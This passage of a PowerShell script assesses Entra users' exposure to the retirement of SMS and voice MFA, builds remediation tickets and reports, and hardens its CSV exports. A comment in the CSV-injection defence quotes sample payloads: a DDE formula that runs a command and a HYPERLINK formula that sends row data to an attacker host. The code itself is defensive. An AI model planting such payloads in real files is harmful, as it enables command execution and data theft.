            -UserId $row.UserId -Risk 'Critical'))
    }

    # High: individual up to the cap, then batched. The cap exists so a tenant with
    # "All users" targeting does not generate a ticket per employee.
    $individualHigh = @($highRows | Select-Object -First ([math]::Max(0, $MaxIndividual - $criticalRows.Count)))
    $batchedHigh = @($highRows | Select-Object -Skip $individualHigh.Count)

    foreach ($row in $individualHigh) {
        $methods = if ($row.PhoneMethodsRegistered) { $row.PhoneMethodsRegistered } else { 'none reported' }
        $guestNote = if ($row.UserType -eq 'Guest') { "`n`nGuest account. Passkey support for B2B and internal guest users follows a separate Microsoft timeline. Confirm the user can register before promising a date." } else { '' }
        $body = @"
USER AT RISK OF SIGN-IN LOCKOUT

User: $($row.DisplayName) <$($row.UserPrincipalName)>
Object ID: $($row.UserId)
User type: $($row.UserType)
Registered phone methods: $methods
All registered methods: $($row.AllMethodsRegistered)
Passwordless capable: No

Why this ticket exists
$($row.Reason)

Actions
1. Direct the user to register a passkey or Microsoft Authenticator, with guidance for their
   device type.
2. Confirm registration completed. The registration report lags, so verify in the portal or
   re-run the assessment rather than assuming.
3. Leave the existing phone method in place until the new method is confirmed working.$guestNote
"@
        $tickets.Add((New-Ticket -Priority 'P2 - High' `
            -Summary "Passkey migration: $($row.DisplayName)" `
            -Description $body -DueDate $primaryDeadline -Category 'Identity / MFA migration' `
            -ContactName $row.DisplayName -ContactEmail $row.UserPrincipalName `
            -UserId $row.UserId -Risk 'High'))
    }

    if ($batchedHigh.Count -gt 0) {
        $sample = ($batchedHigh | Select-Object -First 10 | ForEach-Object { "  - $($_.DisplayName) <$($_.UserPrincipalName)>" }) -join "`n"
        $body = @"
BULK PASSKEY MIGRATION CAMPAIGN

Affected users: $($batchedHigh.Count)
Full list: see the remediation group CSV produced alongside this export.

Why this ticket exists
These users are targeted by the SMS/voice authentication methods policy and have no
phishing-resistant method registered. Individually ticketing them is not practical at this
volume; run a scoped campaign instead.

Actions
1. Create a security group containing this population. The remediation group CSV is the
   membership list, ready for bulk import.
2. Send the awareness communication BEFORE any nudge fires. A prompt that arrives without
   warning generates help desk volume.
3. Run a registration campaign scoped to that group rather than waiting for the
   Microsoft-managed default to fire on 2026-09-01.
4. Re-run the assessment on a cadence to track completion. The registration report lags,
   so do not expect an immediate drop after the campaign starts.
5. Once the population is migrated, remove SMS and voice from the authentication methods
   policy scope.

First 10 users (full list in the remediation group CSV):
$sample
"@
        $tickets.Add((New-Ticket -Priority 'P2 - High' `
            -Summary "Passkey migration campaign: $($batchedHigh.Count) users" `
            -Description $body -DueDate $primaryDeadline -Category 'Identity / MFA migration' `
            -Risk 'High'))
    }

    # Moderate is a single investigation ticket, not per-user work. The finding is about
    # the tenant configuration, not about any individual in the list.
    if ($moderateRows.Count -gt 0) {
        $sample = ($moderateRows | Select-Object -First 10 | ForEach-Object { "  - $($_.DisplayName) <$($_.UserPrincipalName)> [$($_.PhoneMethodsRegistered)]" }) -join "`n"
        $body = @"
VALIDATE LEGACY PER-USER MFA EXPOSURE

Affected users: $($moderateRows.Count)

Why this ticket exists
These users have a phone-based authentication method registered but did not resolve into
the modern authentication methods policy scope for SMS or voice. That usually means one of:

  - They are enabled for SMS or voice through legacy per-user MFA service settings, which
    ARE in scope for the retirement and which this assessment cannot read.
  - Phone numbers were registered under legacy policy and never cleaned up.
  - The registration report is stale relative to a recent policy change.

The first case is the one that matters. Those users are exposed to the 2027-02-01 cutoff
and will not appear in any assessment that only reads the modern policy.

Actions
1. Check legacy per-user MFA service settings for this population.
2. If users are enabled for SMS or voice there, convert them to the modern authentication
   methods policy so the exposure becomes measurable.
3. Fold any confirmed exposure into the main migration campaign.
4. For users who are simply carrying a stale phone registration, remove it once a
   phishing-resistant method is confirmed. This reduces account-recovery attack surface
   independently of the retirement.

First 10 users:
$sample
"@
        $tickets.Add((New-Ticket -Priority 'P3 - Moderate' `
            -Summary "Validate legacy per-user MFA exposure: $($moderateRows.Count) users" `
            -Description $body -DueDate $retirement -Category 'Identity / configuration review' `
            -Risk 'Moderate'))
    }

    Export-AssessmentCsv -Data $tickets.ToArray() -Path $Path
    return [PSCustomObject]@{ Path = $Path; Count = $tickets.Count }
}

function Protect-CsvInjection {
    # CSV/formula injection. A display name of "=cmd|'/c calc'!A1" or
    # "=HYPERLINK(""http://attacker/""&A1,""Click"")" executes when the report is opened in
    # Excel, exfiltrating the row it sits next to. Display names are attacker-influenceable
    # in tenants that allow self-service profile edits or B2B invites, and this report is
    # specifically a file that a manager will open in Excel. Prefixing the value with a
    # single quote makes Excel treat it as literal text.
    # Applied at export time only, so in-memory objects stay pristine for the HTML path,
    # which has its own encoding.
    param([Parameter(ValueFromPipeline)][object]$InputObject)

    process {
        $clone = [ordered]@{}
        foreach ($property in $InputObject.PSObject.Properties) {
            $value = $property.Value
            if ($value -is [string] -and $value.Length -gt 0 -and
                $value[0] -in @('=', '+', '-', '@', [char]9, [char]13)) {
                $value = "'" + $value
            }
            $clone[$property.Name] = $value
        }
        [PSCustomObject]$clone
    }
}

function Protect-OutputFile {
    # Every artefact this script writes is a targeting list: it names privileged accounts
    # and states which of them lack a phishing-resistant method. Files inherit the parent
    # directory ACL by default, which on a shared reports folder can mean everyone.
    # Restrict to the file owner and local Administrators.
    param([Parameter(Mandatory)][string]$Path)

    if (-not $IsWindows) { return }   # POSIX ACLs are out of scope; document instead

    try {
        $acl = Get-Acl -LiteralPath $Path
        $acl.SetAccessRuleProtection($true, $false)   # break inheritance, drop inherited rules
        foreach ($existing in @($acl.Access)) { [void]$acl.RemoveAccessRule($existing) }

        $identities = @(
            [System.Security.Principal.WindowsIdentity]::GetCurrent().User
            (New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-32-544')  # BUILTIN\Administrators
        )
        foreach ($identity in $identities) {
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                $identity, 'FullControl', 'Allow')))
        }
        Set-Acl -LiteralPath $Path -AclObject $acl
    }
    catch {
        # Network shares and some filesystems reject ACL changes. Warn rather than fail:
        # losing the report is worse than losing the hardening, but the operator must know.
        Write-Warning "Could not restrict permissions on $Path. Verify access controls manually. $($_.Exception.Message)"
    }
}

function Export-AssessmentCsv {
    # Single choke point for every CSV this script writes, so injection protection and
    # ACL hardening cannot be forgotten on a future export.
    param(
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Data,
        [Parameter(Mandatory)][string]$Path
    )

    $Data | Protect-CsvInjection | Export-Csv -LiteralPath $Path -NoTypeInformation -Encoding utf8BOM
    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
}

# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

Assert-GraphDependency
$graphContext = Connect-AssessmentGraph

Write-Host 'Reading enabled users (members and guests)...' -ForegroundColor Cyan
$users = Get-GraphCollection -Uri "$script:GraphBase/users?`$select=id,displayName,userPrincipalName,userType,accountEnabled&`$top=999"
$enabledUsers = @($users | Where-Object { (Get-PropertyValue $_ 'accountEnabled') -eq $true })
if ($enabledUsers.Count -eq 0) { throw 'No enabled users were returned. Verify the signed-in account has User.Read.All.' }

$enabledUserIndex = @{}
foreach ($user in $enabledUsers) { $enabledUserIndex[[string](Get-PropertyValue $user 'id')] = $user }

Write-Host 'Reading registration campaign state...' -ForegroundColor Cyan
$campaignState = Get-RegistrationCampaignState

Write-Host 'Resolving SMS and voice policy scope (nested groups and exclusions)...' -ForegroundColor Cyan
$smsScope = Get-MethodPolicyScope -Method sms -EnabledUserIndex $enabledUserIndex
$voiceScope = Get-MethodPolicyScope -Method voice -EnabledUserIndex $enabledUserIndex

Write-Host 'Reading authentication-method registration report...' -ForegroundColor Cyan
# $top is held at 500 for the reports endpoint; it rejects larger page sizes on some tenants.
$registrations = Get-GraphCollection -Uri "$script:GraphBase/reports/authenticationMethods/userRegistrationDetails?`$top=500"
$registrationIndex = @{}
foreach ($registration in $registrations) { $registrationIndex[[string](Get-PropertyValue $registration 'id')] = $registration }

# Entra stores a phone number with a type rather than "SMS" or "voice" registrations.
# mobilePhone can satisfy both SMS and voice; officePhone is voice-only; smsSignIn is
# primary SMS sign-in. All four are retired with Microsoft-provided telecom delivery.
$phoneMethods = @('mobilePhone', 'alternateMobilePhone', 'officePhone', 'smsSignIn')

$rows = foreach ($user in $enabledUsers) {
    $id = [string](Get-PropertyValue $user 'id')
    $registration = $registrationIndex[$id]
    $methods = if ($registration) { @((Get-PropertyValue $registration 'methodsRegistered')) } else { @() }
    $matchingMethods = @($methods | Where-Object { $_ -in $phoneMethods })

    $inSmsScope = $smsScope.UserIds.Contains($id)
    $inVoiceScope = $voiceScope.UserIds.Contains($id)
    $inPolicyScope = $inSmsScope -or $inVoiceScope
    $hasPhoneMethod = $matchingMethods.Count -gt 0
    $isPasswordlessCapable = if ($registration) { [bool](Get-PropertyValue $registration 'isPasswordlessCapable') } else { $false }
    $isAdmin = if ($registration) { [bool](Get-PropertyValue $registration 'isAdmin') } else { $false }
    $userType = [string](Get-PropertyValue $user 'userType')

    $risk = Get-RiskAssessment -InPolicyScope $inPolicyScope -HasPhoneMethodRegistered $hasPhoneMethod `
        -IsPasswordlessCapable $isPasswordlessCapable -IsAdmin $isAdmin -UserType $userType

    [PSCustomObject][ordered]@{
        Risk                             = $risk[0]
        Reason                           = $risk[1]
        DisplayName                      = [string](Get-PropertyValue $user 'displayName')
        UserPrincipalName                = [string](Get-PropertyValue $user 'userPrincipalName')
        UserId                           = $id
        UserType                         = $userType
        IsAdmin                          = $isAdmin
        InSmsPolicyScope                 = $inSmsScope
        InVoicePolicyScope               = $inVoiceScope
        HasPhoneMethodRegistered         = $hasPhoneMethod
        PhoneMethodsRegistered           = ($matchingMethods -join '; ')
        AllMethodsRegistered             = ($methods -join '; ')
        IsPasswordlessCapable            = $isPasswordlessCapable
        IsMfaCapable                     = if ($registration) { [bool](Get-PropertyValue $registration 'isMfaCapable') } else { $false }
        IsMfaRegistered                  = if ($registration) { [bool](Get-PropertyValue $registration 'isMfaRegistered') } else { $false }
        SystemPreferredMethods           = if ($registration) { (@((Get-PropertyValue $registration 'systemPreferredAuthenticationMethods')) -join '; ') } else { '' }
        InRegistrationReport             = [bool]$registration
        RegistrationReportLastUpdatedUtc = if ($registration) { Get-PropertyValue $registration 'lastUpdatedDateTime' } else { $null }
    }
}

$rows = @($rows)
$affectedRows = @($rows | Where-Object { $_.InSmsPolicyScope -or $_.InVoicePolicyScope -or $_.HasPhoneMethodRegistered })
$exportRows = if ($IncludeUnaffected) { $rows } else { $affectedRows }

# Sort so remediation order is the read order: highest risk first, admins ahead of standard users.
$riskOrder = @{ Critical = 0; High = 1; Moderate = 2; Low = 3; Informational = 4 }
$exportRows = @($exportRows | Sort-Object `
    @{ Expression = { $riskOrder[$_.Risk] }; Ascending = $true }, `
    @{ Expression = 'IsAdmin'; Descending = $true }, `
    @{ Expression = 'DisplayName'; Ascending = $true })

$outputDirectory = Split-Path -Parent $OutputPath
if ($outputDirectory -and -not (Test-Path -LiteralPath $outputDirectory)) {
    New-Item -ItemType Directory -Path $outputDirectory -Force | Out-Null
}

if ($exportRows.Count -eq 0) {
    Write-Warning 'No migration candidates were found. An empty CSV will be written for evidence retention.'
}
Export-AssessmentCsv -Data $exportRows -Path $OutputPath

# The registration report lags live directory state; the oldest row age is the honest
# confidence marker for the whole assessment, so it is surfaced in the summary.
$reportTimestamps = @($rows | Where-Object { $_.RegistrationReportLastUpdatedUtc } | ForEach-Object { $_.RegistrationReportLastUpdatedUtc })

$summary = [PSCustomObject][ordered]@{
    TenantId                   = $graphContext.TenantId
    AssessmentTimeUtc          = (Get-Date).ToUniversalTime().ToString('o')
    EnabledUsersAssessed       = $enabledUsers.Count
    RegistrationCampaignState  = $campaignState
    SmsPolicyState             = $smsScope.State
    VoicePolicyState           = $voiceScope.State
    SmsPolicyInclude           = ($smsScope.IncludeNotes -join ' | ')
    SmsPolicyExclude           = ($smsScope.ExcludeNotes -join ' | ')
    VoicePolicyInclude         = ($voiceScope.IncludeNotes -join ' | ')
    VoicePolicyExclude         = ($voiceScope.ExcludeNotes -join ' | ')
    InSmsPolicyScope           = @($rows | Where-Object InSmsPolicyScope).Count
    InVoicePolicyScope         = @($rows | Where-Object InVoicePolicyScope).Count
    MigrationCandidates        = $affectedRows.Count
    Critical                   = @($affectedRows | Where-Object Risk -eq 'Critical').Count
    High                       = @($affectedRows | Where-Object Risk -eq 'High').Count
    Moderate                   = @($affectedRows | Where-Object Risk -eq 'Moderate').Count
    Low                        = @($affectedRows | Where-Object Risk -eq 'Low').Count
    PasswordlessCapableInScope = @($affectedRows | Where-Object { ($_.InSmsPolicyScope -or $_.InVoicePolicyScope) -and $_.IsPasswordlessCapable }).Count
    UsersMissingFromReport     = @($rows | Where-Object { -not $_.InRegistrationReport }).Count
    OldestReportRowUtc         = if ($reportTimestamps.Count -gt 0) { ($reportTimestamps | Sort-Object | Select-Object -First 1) } else { $null }
    OutputPath                 = (Resolve-Path -LiteralPath $OutputPath).Path
}

Write-Host "`n===== ENTRA SMS/VOICE MIGRATION IMPACT =====" -ForegroundColor Magenta
$summary | Format-List | Out-Host

# Optional artefacts. Both are derived from data already in memory; no extra Graph calls.
if ($ExportRemediationGroup) {
    # The migration security group Microsoft's guidance tells you to create in step one.
    # Emitting the membership list is read-only; creating and populating the group is
    # a deliberate manual step, because that is a write and this tool does not write.
    $groupPath = [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_RemediationGroup.csv'
    $groupMembers = @($rows |
        Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') } |
        Select-Object UserPrincipalName, DisplayName, UserId, Risk, IsAdmin)

    Export-AssessmentCsv -Data $groupMembers -Path $groupPath
    $summary | Add-Member -NotePropertyName RemediationGroupPath -NotePropertyValue (Resolve-Path -LiteralPath $groupPath).Path
    Write-Host "Remediation group membership list ($($groupMembers.Count) users): $groupPath" -ForegroundColor Green
}

if ($ExportTickets) {
    $ticketPath = [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_Tickets.csv'
    $ticketResult = New-TicketExport -Rows $rows -Path $ticketPath -Customer $CustomerName -MaxIndividual $MaxIndividualTickets
    $summary | Add-Member -NotePropertyName TicketExportPath -NotePropertyValue (Resolve-Path -LiteralPath $ticketResult.Path).Path
    $summary | Add-Member -NotePropertyName TicketsGenerated -NotePropertyValue $ticketResult.Count
    Write-Host "Ticket queue ($($ticketResult.Count) tickets): $($ticketResult.Path)" -ForegroundColor Green
}

if ($HtmlReport) {
    $htmlPath = [System.IO.Path]::ChangeExtension($OutputPath, 'html')
    $written = New-HtmlReport -Summary $summary -Rows $exportRows -Path $htmlPath -Customer $CustomerName
    $summary | Add-Member -NotePropertyName HtmlReportPath -NotePropertyValue (Resolve-Path -LiteralPath $written).Path
    Write-Host "HTML report: $written" -ForegroundColor Green
}

Write-Host '2026-09-01  Users in SMS/voice scope auto-enabled for passkeys; registration campaign set to Microsoft managed.' -ForegroundColor Yellow
Write-Host '2027-01-28  Deadline to configure a customer-managed telecom provider via the Microsoft Security Store.' -ForegroundColor Yellow
Write-Host '2027-02-01  Microsoft-provided SMS/voice delivery retired. No opt-out.' -ForegroundColor Red
Write-Host 'Interpretation: Critical/High rows deserve validation first; Moderate rows may reveal legacy per-user MFA exposure.' -ForegroundColor Yellow
Write-Host 'Passkey deployment guide: https://aka.ms/passkey-deployment-guide' -ForegroundColor Cyan
Write-Host 'No tenant settings were changed.' -ForegroundColor Green

if ($PassThru) { $exportRows }
$summary
